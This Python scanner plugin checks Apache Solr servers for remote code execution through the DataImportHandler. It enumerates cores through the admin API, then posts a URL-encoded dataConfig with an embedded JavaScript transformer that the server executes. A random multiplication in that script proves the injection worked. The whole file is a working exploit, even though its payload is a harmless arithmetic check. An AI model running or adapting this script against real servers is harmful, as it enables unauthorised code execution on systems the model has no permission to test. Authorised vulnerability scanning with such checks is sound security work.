#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.SOLR

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in [self.base_url, self.base_url+"solr/"]:
                    url = path + 'admin/cores?wt=json'
                    try:
                        async with session.get(url=url, allow_redirects=False) as res:
                            if res and res.status == 200:
                                text = await res.text()
                                if 'responseHeader' in text:
                                    matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
                                    if matchObj:
                                        name = matchObj.group(1)
                                        headers = {'Content-Type': 'text/html'}
                                        ran1 = random.randint(100, 999)
                                        ran2 = random.randint(100, 999)
                                        data = '''<?xml version="1.0" encoding="utf-8"?>
<books>
<book>
</book>
</books>'''
                                        url1 = path + name + '/dataimport?command=full-import&debug=true&wt=json&indent=true&verbose=false&clean=false&commit=false&optimize=false&dataConfig=%3CdataConfig%3E%0D%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22DEBUG%22%20%2F%3E%0D%0A%3Cscript%3E%3C!%5BCDATA%5B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20function%20execute(row)%20%20%20%20%7B%0D%0Arow.put(%22id%22,{ran1}*{ran2})%3B%0D%0Areturn%20row%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%5D%5D%3E%3C%2Fscript%3E%0D%0A%3Cdocument%3E%0D%0A%20%20%20%20%3Centity%0D%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0D%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0D%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0D%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0D%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0D%0A%20%20%20%20%20%20%20%20forEach%3D%22%2Fbooks%2Fbook%22%0D%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Aexecute%22%20%3E%0D%0A%09%09%09%3Cfield%20column%3D%22id%22%20name%3D%22id%22%2F%3E%0D%0A%20%20%20%20%3C%2Fentity%3E%0D%0A%3C%2Fdocument%3E%0D%0A%3C%2FdataConfig%3E'.format(ran1=ran1, ran2=ran2)
                                        async with session.post(url=url1, headers=headers, data=data,  allow_redirects=False) as res1:
                                            if res1 and res1.status == 200:
                                                text1 = await res1.text()
                                                if str(ran1*ran2) in text1:
                                                    yield url
                    except:
                        pass
                                                